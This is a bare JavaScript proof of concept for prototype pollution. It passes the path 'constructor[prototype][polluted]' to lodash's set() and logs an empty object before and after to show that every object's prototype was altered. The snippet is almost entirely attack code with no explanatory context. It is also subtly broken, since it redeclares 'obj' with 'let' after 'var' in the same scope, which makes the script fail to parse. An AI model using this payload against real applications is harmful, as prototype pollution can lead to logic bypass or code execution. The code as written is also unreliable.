var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const lod = require('lodash');
let obj = {};
console.log({}.polluted);
lod.set(obj, 'constructor[prototype][polluted]', 'yes');
console.log({}.polluted);
delete obj.__proto__.polluted;